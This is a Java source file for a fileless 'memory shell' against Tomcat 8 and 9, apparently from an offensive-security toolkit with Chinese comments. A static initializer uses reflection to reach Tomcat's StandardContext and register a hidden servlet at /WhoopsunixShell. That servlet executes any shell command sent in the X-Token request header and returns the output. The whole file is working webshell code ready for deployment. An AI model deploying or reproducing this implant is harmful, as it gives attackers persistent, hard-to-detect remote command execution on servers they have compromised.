package com.demo.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * ContextClassLoader 注入 Tomcat Servlet 型内存马
 * Tomcat 8 9
 */
public class TSMSContextClass implements Servlet {

    final private static String NAME = "Whoopsunix";
    final private static String pattern = "/WhoopsunixShell";

    public TSMSContextClass() {

    }

    static {
        try {
            // 获取 standardContext
            org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            org.apache.catalina.core.StandardContext standardContext;
            try {
                Method getResourcesmethod = webappClassLoaderBase.getClass().getDeclaredMethod("getResources");
                getResourcesmethod.setAccessible(true);
                Object resources = getResourcesmethod.invoke(webappClassLoaderBase);
                Method getContextmethod = resources.getClass().getDeclaredMethod("getContext");
                getContextmethod.setAccessible(true);
                standardContext = (org.apache.catalina.core.StandardContext) getContextmethod.invoke(resources);
            } catch (Exception e) {
                Object root = getFieldValue(webappClassLoaderBase, "resources");
                standardContext = (org.apache.catalina.core.StandardContext) getFieldValue(root, "context");
            }

            // wrapper 封装
            if (standardContext.findChild(NAME) == null) {
                org.apache.catalina.Wrapper wrapper = standardContext.createWrapper();
                wrapper.setName(NAME);
                Servlet servlet = new TSMSContextClass();
                wrapper.setServletClass(servlet.getClass().getName());
                wrapper.setServlet(servlet);
                // 添加到 standardContext
                standardContext.addChild(wrapper);

                try{
                    // M1 Servlet映射到URL模式
                    // standardContext.addServletMapping(pattern,NAME);
                    Method addServletMappingMethod = standardContext.getClass().getDeclaredMethod("addServletMapping", String.class, String.class);
                    addServletMappingMethod.setAccessible(true);
                    addServletMappingMethod.invoke(standardContext, pattern, NAME);
                } catch (NoSuchMethodException e) {
                    // M2 Servlet3 新特性 Dynamic
//                        javax.servlet.ServletRegistration.Dynamic registration = new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext);
//                        registration.addMapping(pattern);
                    Class.forName("javax.servlet.ServletRegistration$Dynamic").getMethod("addMapping", String[].class).invoke(new org.apache.catalina.core.ApplicationServletRegistration(wrapper, standardContext), (Object) new String[]{pattern});
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {

    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String header = httpServletRequest.getHeader("X-Token");
            if (header == null) {
                return;
            }
            String result = exec(header);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println("TSMSContextClass injected");
            printWriter.println(result);
        } catch (Exception e) {

        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }
}
